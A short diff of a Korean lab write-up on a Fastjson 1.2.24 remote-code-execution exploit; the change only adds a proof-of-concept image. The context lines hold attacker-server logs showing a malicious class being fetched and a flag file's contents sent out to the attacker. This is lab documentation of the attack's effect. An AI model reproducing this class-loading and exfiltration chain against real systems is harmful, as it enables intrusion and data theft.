@@ -50,6 +50,8 @@ docker container logs 1224-rce-attacker-1 # 공격자 컨테이너 로그를 확
 172.30.0.2 - - [05/May/2024 07:23:00] "GET /TouchFile.class HTTP/1.1" 200 -
 172.30.0.2 - - [05/May/2024 07:23:00] "GET /?flag=464c41477b666173746a736f6e5f312e322e32345f7263657d HTTP/1.1" 200 -
 ```
+![image](poc.png)
+
 공격자 컨테이너 로그를 확인하면 `TouchFile.class` 파일을 읽어들여 실행하고, 실행된 클래스가 `/flag` 파일의 내용을 공격자에게 전송하는 것을 확인할 수 있다.
 
 ## 정리
